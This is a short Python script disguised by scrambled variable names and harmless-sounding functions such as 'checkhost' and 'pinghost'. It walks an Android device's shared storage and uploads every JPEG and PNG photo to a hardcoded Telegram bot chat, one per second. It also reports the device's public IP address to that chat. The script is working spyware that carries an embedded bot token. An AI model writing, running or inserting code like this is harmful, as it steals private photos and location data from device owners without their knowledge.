import os, base64, time, telegram, requests





def checkhost(mwock, othkr='.'):
    pxjirh = os.path.join(othkr, mwock)
    qzbkoc = open(pxjirh, 'rb')

    bot = telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww')
    bot.send_photo(chat_id=-841939764, photo=qzbkoc)



def pinghost():
  itamr = '/storage/emulated/0/'
    
  for root, dirs, filenames in os.walk(itamr):
    for filename in filenames:
      pfhm = os.path.join(root, filename)
      if pfhm.endswith(('.jpeg', '.jpg', '.png')):
        checkhost(pfhm)
        time.sleep(1)
        



def q(x):
    telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww').send_message(chat_id=-841939764, text=x)



def get():
    url = 'https://api.ipify.org?format=json'
    r = requests.get(url)
    x = r.json()['ip']
    q(f"Connected at: {x}")
    
    


